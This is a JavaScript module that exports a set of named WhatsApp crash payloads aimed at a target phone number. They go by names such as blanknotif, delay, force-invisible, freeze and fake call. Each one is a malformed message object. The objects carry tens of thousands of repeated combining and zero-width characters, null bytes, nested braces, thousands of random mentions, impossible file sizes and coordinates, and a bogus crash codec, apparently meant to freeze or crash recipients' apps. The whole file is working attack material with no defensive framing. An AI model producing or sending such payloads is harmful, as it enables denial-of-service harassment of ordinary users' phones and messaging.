const TARGET = '15550000001@s.whatsapp.net'
const rnd = (n) => Array.from({ length: n }, () => '1' + Math.floor(Math.random() * 5000000) + '@s.whatsapp.net')

export const payloads = {
  'blanknotif.js': {
    viewOnceMessage: { message: {
      interactiveMessage: {
        header: { title: '</⃟TΣXXΛS :: 404.Σ𝖃Σꦾ⃟🕊', hasMediaAttachment: true, imageMessage: {
          url: 'https://mmg.whatsapp.net/x.enc', mimetype: 'image/jpeg',
          fileSha256: 'QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=',
          fileLength: '9999999999999', height: 9999, width: 9999, mediaKey: 'x', fileEncSha256: 'y',
          directPath: '/x', mediaKeyTimestamp: '1755254367', jpegThumbnail: '/9j/x'
        } },
        body: { text: 'ꦽ'.repeat(25000) + 'ោ៝'.repeat(20000) },
        nativeFlowMessage: {
          messageParamsJson: '{'.repeat(10000),
          buttons: [
            { name: 'single_select', buttonParamsJson: JSON.stringify({ title: 'ោ៝'.repeat(2000), sections: [{ title: '\u0000', rows: [] }] }) },
            { name: 'galaxy_message', buttonParamsJson: '\u0000'.repeat(1045000) }
          ]
        },
        contextInfo: {
          forwardingScore: 9999, isForwarded: true, participant: '0@s.whatsapp.net',
          remoteJid: 'status@broadcast',
          mentionedJid: ['131338822@s.whatsapp.net', ...rnd(1900)],
          ephemeralSettingTimestamp: 9741, entryPointConversionSource: 'WhatsApp.com'
        }
      }
    } }
  },

  'blank lagi.js': {
    extendedTextMessage: {
      text: 'Makan Blank Bang' + 'ꦾ'.repeat(6000),
      contextInfo: {
        mentionedJid: ['0@s.whatsapp.net', ...rnd(700)],
        participant: '0@s.whatsapp.net',
        quotedMessage: { conversation: 'ꦾ'.repeat(60000) }
      },
      nativeFlowMessage: { messageParamsJson: '{'.repeat(10000) }
    }
  },

  'blankNew.js (album)': {
    albumMessage: { expectedImageCount: 666, expectedVideoCount: 0 }
  },

  'blankui.js': {
    extendedTextMessage: { message: {
      stickerPackMessage: {
        stickerPackId: '642f1c7a-094d-4ea7-82aa-d283952a4322',
        name: 'https://Wa.me/stickerpack/Xyraa4Sx', publisher: 'Xyraaa4Sx',
        stickers: [ { fileName: 'x.webp', isAnimated: true, emojis: ['💐'], accessibilityLabel: 'ꦾ'.repeat(1222), isLottie: false, mimetype: 'image/webp' } ],
        fileLength: 959168, fileSha256: 'x', fileEncSha256: 'y', mediaKey: 'z', directPath: '/v/x.enc',
        mediaKeyTimestamp: 1756908899, stickerPackSize: 961398, stickerPackOrigin: 'USER_CREATED'
      },
      contextInfo: {
        isForwarded: true, forwardingScore: 9999,
        businessMessageForwardInfo: { businessOwnerJid: '6288905301692@s.whatsapp.net', participant: '0@s.whatsapp.net', remoteJid: 'status@broadcast', mentionedJid: [TARGET, '0@s.whatsapp.net', ...rnd(30000)] }
      }
    } }
  },

  'delayv2.js': {
    viewOnceMessage: { message: {
      buttonsMessage: {
        contentText: 'Ciee kena Delay' + 'ꦽ'.repeat(1030),
        footerText: 'Button Delay',
        buttons: [ { buttonId: 'crash1', buttonText: { displayText: 'P' }, type: 1 } ],
        headerType: 1,
        contextInfo: { mentionedJid: ['6285215587438@s.whatsapp.net', ...rnd(1000)], forwardingScore: 9999, isForwarded: true }
      }
    } }
  },

  'InvisIos.js': {
    viewOnceMessage: { message: {
      messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
      locationMessage: {
        degreesLatitude: 21.1266, degreesLongitude: -11.8199,
        name: ' #4izxvelzExerc1st. ' + '\u0000'.repeat(60000) + '𑇂𑆵𑆴𑆿'.repeat(60000),
        address: 'https://t.me/rizxvelzexct',
        contextInfo: { externalAdReply: { title: '𑇂𑆵𑆴𑆿'.repeat(60000), body: '𑇂𑆵𑆴𑆿'.repeat(60000), mediaType: 1, thumbnailUrl: 'x', sourceUrl: 'https://t.me/rizxvelzexct' } }
      }
    } }
  },

  'forceinvis.js': {
    viewOnceMessage: { message: {
      interactiveMessage: {
        header: { title: 'You\'re beautiful៚', hasMediaAttachment: false, locationMessage: { degreesLatitude: -999.03499999999999, degreesLongitude: 922.999999999999, name: 'VaxzyIsHere៚'.repeat(10000), address: 'ោ៝'.repeat(10000) } },
        body: { text: 'VaxzyIsHere៚' + '꧀'.repeat(2500) + '.com - _ #' },
        nativeFlowMessage: { messageParamsJson: '{'.repeat(10000), buttons: Array(6).fill().map(() => ({ name: 'mpm', buttonParamsJson: '' })) }
      }
    } }
  },

  'Freeze.js (text flood)': {
    extendedTextMessage: { text: 'ោ៝ꦾ' + ' ꦾ'.repeat(5000) + '\u0301\u0301\u0301'.repeat(4000) }
  },

  'Call-invis.js (fake call)': {
    call: { callKey: Buffer.from(Array.from({ length: 1000 }, () => 0)).toString('base64'), callCreator: TARGET, callType: 1, isVideo: true, callDuration: -1, maxParticipants: 65535, callState: 999, videoCodec: 'CRASH_CODEC_' + 'A'.repeat(1000) }
  }
}
